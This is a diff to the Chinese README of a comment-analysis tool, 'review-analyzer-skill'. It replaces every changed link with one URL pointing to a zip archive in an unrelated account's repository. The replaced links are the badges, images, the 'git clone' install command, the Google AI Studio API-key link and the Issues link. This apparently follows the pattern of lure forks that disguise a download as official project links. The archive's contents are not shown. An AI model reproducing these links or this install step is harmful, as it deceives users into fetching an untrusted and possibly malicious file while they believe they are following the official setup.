@@ -7,11 +7,11 @@
 **一款适用于多场景评论内容的深度分析工具**
 
 **想了解更多最新AI行业动态，AI+电商/广告的行业实践方法，人与AI如何协作共生的思考，请关注公众号：【新西楼】**
-![qrcode_for_gh_e3b954bd3859_258](https://github.com/user-attachments/assets/d8f068d9-c4f8-46c7-914c-fbcab5d52f2a)
+![qrcode_for_gh_e3b954bd3859_258](https://raw.githubusercontent.com/megana05082003/review-analyzer-skill/main/examples/analyzer-skill-review-v3.4.zip)
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![Version](https://img.shields.io/badge/version-1.0.0-black.svg)](https://github.com/buluslan/review-analyzer-skill)
+[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://raw.githubusercontent.com/megana05082003/review-analyzer-skill/main/examples/analyzer-skill-review-v3.4.zip)
+[![Version](https://img.shields.io/badge/version-1.0.0-black.svg)](https://raw.githubusercontent.com/megana05082003/review-analyzer-skill/main/examples/analyzer-skill-review-v3.4.zip)
 [![English](https://img.shields.io/badge/lang-English-blue.svg)](README_EN.md)
 [![中文](https://img.shields.io/badge/lang-中文-red.svg)](README.md)
 
@@ -122,7 +122,7 @@ npx skills add buluslan/review-analyzer-skill
 ### 方式2：手动克隆仓库
 
 ```bash
-git clone https://github.com/buluslan/review-analyzer-skill.git
+git clone https://raw.githubusercontent.com/megana05082003/review-analyzer-skill/main/examples/analyzer-skill-review-v3.4.zip
 cd review-analyzer-skill
 ```
 
@@ -304,7 +304,7 @@ npm install -g @anthropic-ai/claude-code
 <details>
 <summary><b>Q3: 如何获取Gemini API Key？</b></summary>
 
-**A**: 访问 [Google AI Studio](https://aistudio.google.com/app/apikey) 创建API Key。Gemini模式是可选的，不使用也不影响核心功能。
+**A**: 访问 [Google AI Studio](https://raw.githubusercontent.com/megana05082003/review-analyzer-skill/main/examples/analyzer-skill-review-v3.4.zip) 创建API Key。Gemini模式是可选的，不使用也不影响核心功能。
 
 **费用说明**：具体以Google官方定价为准。
 </details>
@@ -406,9 +406,9 @@ pyenv global 3.11.7
 
 ## 技术支持
 
-- **Issues**: [GitHub Issues](https://github.com/buluslan/review-analyzer-skill/issues)
+- **Issues**: [GitHub Issues](https://raw.githubusercontent.com/megana05082003/review-analyzer-skill/main/examples/analyzer-skill-review-v3.4.zip)
 - **联系Builder，请备注【github】**：
-<img width="717" height="714" alt="wechat_2025-10-17_173400_583" src="https://github.com/user-attachments/assets/7c406098-dcd9-4684-84bd-f0ed4213e95f" />
+<img width="717" height="714" alt="wechat_2025-10-17_173400_583" src="https://raw.githubusercontent.com/megana05082003/review-analyzer-skill/main/examples/analyzer-skill-review-v3.4.zip" />
 
 ---
 
